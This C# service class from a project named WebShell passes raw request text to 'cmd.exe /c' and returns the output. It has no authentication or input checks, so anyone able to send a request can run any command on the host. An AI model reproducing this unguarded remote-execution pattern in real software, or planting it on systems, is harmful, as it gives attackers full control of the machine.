using System;
using System.Collections.Generic;
using System.ComponentModel.DataAnnotations;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WebShell.Models;
using WebShell.Repositories;


namespace WebShell.Services
{
    public class ProcessingService
    {
        RequestRepository Database { get; set; }
        public ProcessingService(RequestRepository repo)
        {
            Database = repo;
        }

        public string ProcessRequest(Request request)
        {
            request.Text = request.Text != null ? request.Text : "";
            request.Text = request.Text.Replace("%20", " ");

            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            string[] input = request.Text.Split(" ");
            process.StartInfo.ArgumentList.Add("/c");
            foreach (string s in input)
            {
                process.StartInfo.ArgumentList.Add(s);
            }

            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;

            StringBuilder output = new StringBuilder();
            StringBuilder erOutput = new StringBuilder();

            process.OutputDataReceived += new DataReceivedEventHandler((sender, e) =>
            {
                if (!process.WaitForExit(2000))
                {
                    process.Kill();
                }
                if (!String.IsNullOrEmpty(e.Data))
                {
                    output.Append(e.Data + "\n");
                }
            });
            process.ErrorDataReceived += new DataReceivedEventHandler((sender, er) =>
            {
                if (!process.WaitForExit(2000))
                {
                    process.Kill();
                }
                if (!String.IsNullOrEmpty(er.Data))
                {
                    erOutput.Append(er.Data + "\n");
                }
            });

            process.Start();

            process.BeginOutputReadLine();
            process.BeginErrorReadLine();
            process.WaitForExit();

            if (output.Length > 0)
            {
                Database.Create(request);
                Database.Save();

                return output.ToString();
            }
            else if (erOutput.Length > 0)
            {
                Database.Create(request);
                Database.Save();

                return erOutput.ToString();
            }
            else
            {
                return "";
            }

        }

        public IEnumerable<Request> GetRequests()
        {
            return Database.GetAll();
        }

    }
}
